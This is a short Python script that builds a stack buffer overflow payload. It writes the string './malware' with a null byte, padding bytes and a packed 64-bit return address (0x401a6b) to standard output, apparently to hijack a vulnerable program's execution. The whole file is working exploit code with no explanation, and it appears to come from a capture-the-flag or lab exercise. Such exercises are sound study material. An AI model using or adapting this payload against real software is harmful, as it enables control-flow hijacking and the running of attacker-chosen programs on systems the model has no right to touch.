import sys
import struct

target_addr = 0x401a6b

payload = b'./malware\x00' 
payload += b'A' * 6        
payload += b'B' * 8        
payload += struct.pack('<Q', target_addr)

sys.stdout.buffer.write(payload)